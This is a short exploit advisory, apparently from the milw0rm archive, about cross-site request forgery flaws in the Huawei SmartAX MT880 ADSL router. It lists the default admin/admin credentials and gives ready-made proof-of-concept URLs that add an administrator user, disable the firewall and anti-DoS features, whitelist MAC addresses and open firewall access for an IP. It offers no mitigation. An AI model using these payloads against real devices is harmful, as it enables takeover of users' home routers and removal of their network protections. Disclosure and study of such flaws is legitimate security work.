<html><head><title>Huawei SmartAX MT880 Multiple XSRF Vulnerabilities</title></head><pre>Description:
Huawei MT880 is a device offered by the algerian telecom operator -
FAWRI, to provide ADSL Internet connexion and it's already widely in use.
Overview:
Huawei MT880 firmware and its default configuration has flaws, which
allows LAN users to gain unauthorized full access to device.

Here are just limited PoCs.

Default credentials on the web-based management interface:

admin/admin

Possible XSRFs:

Adding an administrator user:
http://admin:admin@192.168.1.1/Action?user_id=jerome&amp;priv=1&amp;pass1=jerome&amp;pass2=jerome&amp;id=70


Disabling firewall/anti-DoS... features:
http://admin:admin@192.168.1.1/Action?blacklisting_status=1&amp;bl_list=10&amp;attack_status=0&amp;dos_status=0&amp;id=42&amp;max_tcp=25&amp;max_icmp=25&amp;max_host=70


Adding a MAC address to the whitelist:
http://admin:admin@192.168.1.1/Action?insrcmac66=123456789123&amp;inblocksrcmac66=1&amp;insrcmac67=000000000000&amp;inblocksrcmac67=1&amp;insrcmac68=000000000000&amp;inblocksrcmac68=1&amp;insrcmac69=000000000000&amp;inblocksrcmac69=1&amp;insrcmac70=000000000000&amp;inblocksrcmac70=1&amp;insrcmac71=000000000000&amp;inblocksrcmac71=1&amp;insrcmac72=000000000000&amp;inblocksrcmac72=1&amp;insrcmac73=000000000000&amp;inblocksrcmac73=1&amp;insrcmac74=000000000000&amp;inblocksrcmac74=1&amp;insrcmac75=000000000000&amp;inblocksrcmac75=1&amp;insrcmac76=000000000000&amp;inblocksrcmac76=1&amp;insrcmac77=000000000000&amp;inblocksrcmac77=1&amp;insrcmac78=000000000000&amp;inblocksrcmac78=1&amp;insrcmac79=000000000000&amp;inblocksrcmac79=1&amp;insrcmac80=000000000000&amp;inblocksrcmac80=1&amp;insrcmac81=000000000000&amp;inblocksrcmac81=1&amp;id=104


Adding an IP address allowed by the firewall:
http://admin:admin@192.168.1.1/Action?ip_1=192&amp;ip_2=168&amp;ip_3=1&amp;ip_4=2&amp;mask_1=255&amp;mask_2=255&amp;mask_3=255&amp;mask_4=255&amp;gateway_1=192&amp;gateway_2=168&amp;gateway_3=1&amp;gateway_4=1&amp;id=7


Over flaws are not covered in this advisory.

Cheers
/JA

# milw0rm.com [2009-08-24]</pre></html>